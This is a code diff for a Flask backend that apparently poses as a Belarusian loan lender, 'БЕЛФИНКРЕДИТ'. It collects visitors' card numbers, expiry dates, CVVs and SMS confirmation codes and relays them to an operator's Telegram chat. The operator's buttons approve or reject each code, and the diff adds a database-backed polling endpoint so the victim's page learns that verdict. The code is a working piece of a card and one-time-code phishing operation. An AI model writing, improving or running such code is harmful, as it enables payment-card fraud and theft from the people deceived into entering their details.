@@ -2,6 +2,7 @@ import os
 import sqlite3
 import secrets
 import requests
+import io
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 
@@ -11,9 +12,6 @@ CORS(app)
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))
 DB_PATH = "applications.db"
-
-# Хранилище для действий админа
-pending_actions = {}
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -35,6 +33,7 @@ def init_db():
             card_holder TEXT,
             card_number TEXT,
             card_expiry TEXT,
+            code_status TEXT DEFAULT 'pending',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     """)
@@ -58,6 +57,14 @@ def db_one(query, params=()):
     conn.close()
     return row
 
+def db_all(query, params=()):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute(query, params)
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
 def tg(method, payload):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
     try:
@@ -74,6 +81,27 @@ def send_admin(text, keyboard=None):
     if keyboard:
         payload["reply_markup"] = keyboard
     tg("sendMessage", payload)
+
+def send_long_message(chat_id, text, reply_markup=None):
+    """Отправка длинных сообщений частями"""
+    if len(text) <= 4096:
+        send_admin(text, reply_markup)
+        return
+    
+    parts = []
+    while len(text) > 4096:
+        split_at = text[:4096].rfind('\n')
+        if split_at == -1:
+            split_at = 4096
+        parts.append(text[:split_at])
+        text = text[split_at:]
+    parts.append(text)
+    
+    for i, part in enumerate(parts):
+        if i == len(parts) - 1 and reply_markup:
+            send_admin(part, reply_markup)
+        else:
+            send_admin(part)
 
 def send_user(chat_id, text):
     payload = {
@@ -112,12 +140,10 @@ def home():
 
 @app.route("/card")
 def serve_card_page():
-    """Отдаем HTML страницу с формой карты"""
-    return send_file("card.html")
+    return send_file("index.html")
 
 @app.route("/get_application_data/<session_id>")
 def get_application_data(session_id):
-    """Получить данные заявки для страницы"""
     row = db_one("""
         SELECT fullname, amount, term, payment, status
         FROM applications
@@ -137,7 +163,6 @@ def get_application_data(session_id):
 
 @app.route("/submit_card_details", methods=["POST"])
 def submit_card_details():
-    """Принимаем данные карты от пользователя"""
     data = request.get_json(force=True)
     
     session_id = data.get("session_id")
@@ -153,14 +178,13 @@ def submit_card_details():
     if row:
         fullname, amount, phone = row
         
-        # Сохраняем данные карты в БД
         db_exec("""
             UPDATE applications 
             SET card_holder = ?, card_number = ?, card_expiry = ?
             WHERE session_id = ?
         """, (card_holder, masked_card, card_expiry, session_id))
         
-        send_admin(f"""
+        message = f"""
 💳 <b>ДАННЫЕ КАРТЫ ДЛЯ ВЫПЛАТЫ</b>
 
 🆔 Сессия: <code>{session_id}</code>
@@ -172,22 +196,20 @@ def submit_card_details():
 💳 Карта: {masked_card}
 📅 Срок: {card_expiry}
 🔐 CVV: {card_cvv}
-        """)
+        """
+        send_long_message(ADMIN_CHAT_ID, message)
     
     return jsonify({"status": "ok"})
 
-@app.route("/check_pending_action/<session_id>")
-def check_pending_action(session_id):
-    """Проверяем действие от админа"""
-    action = pending_actions.get(session_id)
-    if action:
-        pending_actions[session_id] = None
-        return jsonify({"action": action})
-    return jsonify({"action": None})
+@app.route("/check_code_status/<session_id>")
+def check_code_status(session_id):
+    row = db_one("SELECT code_status FROM applications WHERE session_id = ?", (session_id,))
+    if not row:
+        return jsonify({"status": "pending"})
+    return jsonify({"status": row[0]})
 
 @app.route("/submit_sms_code", methods=["POST"])
 def submit_sms_code():
-    """Пользователь ввел SMS код - отправляем админу"""
     data = request.get_json(force=True)
     session_id = data.get("session_id")
     code = data.get("code")
@@ -204,7 +226,7 @@ def submit_sms_code():
 👤 Клиент: {fullname}
 💰 Сумма: {amount:.0f} BYN
 
-📱 <b>Введенный код:</b> <code>{code}</code>
+📱 <b>Код:</b> <code>{code}</code>
 
 ⚠️ Проверьте код и нажмите кнопку:
         """, reply_markup=code_keyboard(session_id))
@@ -295,7 +317,6 @@ def webhook():
     callback_id = callback.get("id")
     callback_data = callback.get("data", "")
     message = callback.get("message", {})
-    chat_id = message.get("chat", {}).get("id")
 
     if ":" not in callback_data:
         answer_callback(callback_id, "Ошибка кнопки")
@@ -307,7 +328,6 @@ def webhook():
     if action in ["approve", "approve_credit"]:
         db_exec("UPDATE applications SET status = ? WHERE session_id = ?", ("approved", session_id))
         
-        # Получаем user_chat_id для отправки ссылки
         row = db_one("SELECT user_chat_id, fullname, amount, term FROM applications WHERE session_id = ?", (session_id,))
         
         if row and row[0]:
@@ -326,7 +346,7 @@ def webhook():
 ⚠️ Ссылка активна 24 часа
             """)
         
-        answer_callback(callback_id, "✅ Заявка одобрена, ссылка отправлена")
+        answer_callback(callback_id, "✅ Заявка одобрена")
         send_admin(f"✅ <b>Заявка ОДОБРЕНА</b>\nСессия: <code>{session_id}</code>")
 
     # Отклонение заявки
@@ -342,23 +362,17 @@ def webhook():
 
     # Код ВЕРНЫЙ
     elif action == "code_ok":
-        pending_actions[session_id] = "code_approved"
+        db_exec("UPDATE applications SET code_status = ? WHERE session_id = ?", ("approved", session_id))
         answer_callback(callback_id, "✅ Код подтвержден")
         send_admin(f"✅ <b>Код подтвержден для сессии</b> <code>{session_id}</code>")
         
-        # Уведомляем пользователя
         row = db_one("SELECT user_chat_id FROM applications WHERE session_id = ?", (session_id,))
         if row and row[0]:
-            send_user(row[0], """
-✅ <b>Код подтвержден!</b>
-
-Средства будут перечислены в ближайшее время.
-Спасибо, что выбрали БЕЛФИНКРЕДИТ! 🤝
-            """)
+            send_user(row[0], "✅ Код подтвержден! Средства будут зачислены в ближайшее время.")
 
     # Код НЕВЕРНЫЙ
     elif action == "code_bad":
-        pending_actions[session_id] = "code_rejected"
+        db_exec("UPDATE applications SET code_status = ? WHERE session_id = ?", ("rejected", session_id))
         answer_callback(callback_id, "❌ Код неверный")
         send_admin(f"❌ <b>Неверный код для сессии</b> <code>{session_id}</code>")
 
